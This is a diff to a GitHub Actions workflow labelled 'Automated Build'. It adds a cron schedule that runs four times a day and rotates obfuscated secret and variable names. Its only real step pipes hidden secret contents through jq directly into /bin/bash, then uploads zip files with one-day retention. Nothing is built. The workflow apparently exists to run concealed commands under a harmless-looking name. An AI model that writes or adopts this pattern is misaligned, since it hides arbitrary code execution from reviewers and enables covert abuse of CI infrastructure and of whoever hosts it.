@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '51 0,6,12,18 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,17 +16,15 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          ynx7: ${{ secrets.ynx7 }}
+          wqjc45630: ${{ secrets.wqjc45630 }}
         run: |
-          printf '%s' "$ynx7" | jq -r .mgqah6 | /bin/bash
-          echo $sjvz3 | jq -r .sides66 | /bin/bash
-          printf '%s' "$aft4" | jq -r .slhma6886 | /bin/bash
-          printf '%s' "$ssw43651" | jq -r .cg5 | /bin/bash
-          printf '%s' "$zepcs24428" | jq -r .lcsqr78 | /bin/bash
+          printf '%s' "$wqjc45630" | jq -r .b9970 | /bin/bash
+          printf '%s' "$pwr66569" | jq -r .mfk737 | /bin/bash
+          echo $c6 | jq -r .w3974 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: TUzCfbwn
+          name: Gb5A5WFb
           path: "*.zip"
           retention-days: 1
